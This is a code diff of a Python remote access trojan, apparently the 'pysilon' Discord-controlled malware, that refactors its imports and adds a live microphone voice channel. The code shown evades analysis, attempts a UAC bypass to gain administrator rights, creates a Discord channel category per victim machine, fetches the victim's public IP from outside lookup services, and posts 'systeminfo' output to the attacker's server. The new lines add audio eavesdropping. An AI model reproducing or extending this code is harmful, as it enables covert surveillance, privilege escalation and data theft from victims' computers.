@@ -1,20 +1,21 @@
 import discord
+import os
 import subprocess
 from discord.ext import commands
-from resources.modules.misc import *
-from resources.modules.protections import *
-from resources.modules.uac_bypass import *
+import resources.modules.misc as pysilon_misc
+import resources.modules.protections as pysilon_protections
+import resources.modules.uac_bypass as uac_bypass
 from urllib.request import urlopen
 
-if protection_check():
+if pysilon_protections.protection_check():
     os._exit(0)
 
-if single_instance_lock():
+if pysilon_misc.single_instance_lock():
     os._exit(0)
 
-if not IsAdmin():
-    if GetSelf()[1]:
-        if UACbypass():
+if not uac_bypass.IsAdmin():
+    if uac_bypass.GetSelf()[1]:
+        if uac_bypass.UACbypass():
             os._exit(0)
 
 client = commands.Bot(command_prefix=['.'], intents=discord.Intents.all(), case_insensitive=True)
@@ -27,9 +28,10 @@ clipper_stop = False
 bot_token = ""
 guild_ids = []
 channel_ids = {                                                    
-    'info': '',                                                  
-    'main': '',                                                                                                  
-    'file': '',                                                                                                    
+    'info': 'auto',                                               
+    'main': 'auto',                                                                                               
+    'file': 'auto',
+    'voice': 'auto'                                                                                            
 }
 
 @client.event
@@ -69,11 +71,16 @@ async def on_ready():
             temp = await client.get_guild(guild_id).create_text_channel('file', category=category)
             channel_ids['file'] = temp.id
 
+        if 'Live microphone' not in category_channel_names and channel_ids['voice']: 
+            temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category)
+            channel_ids['voice'] = temp.id
+
     if first_run:
         category = await client.get_guild(guild_id).create_category(hwid)
         temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
         temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
         temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category); channel_ids['file'] = temp.id
+        temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id
 
         try: 
             await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ident.me').read().decode('utf-8') + ' [ident.me]```')
@@ -82,7 +89,7 @@ async def on_ready():
             await client.get_channel(channel_ids['info']).send('```IP address: ' + urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8') + ' [lafibre.info]```')
         except: pass
         
-        system_info = force_decode(subprocess.run('systeminfo', capture_output= True, shell= True).stdout).strip().replace('\\xff', ' ')
+        system_info = pysilon_misc.force_decode(subprocess.run('systeminfo', capture_output= True, shell= True).stdout).strip().replace('\\xff', ' ')
         
         chunk = ''
         for line in system_info.split('\n'):
@@ -101,6 +108,8 @@ async def on_ready():
                 channel_ids['main'] = channel.id
             elif channel.name == 'file-related':
                 channel_ids['file'] = channel.id
+            elif channel.name == 'Live microphone':
+                channel_ids['voice'] = channel.id
 
 @client.event
 async def on_message(ctx):
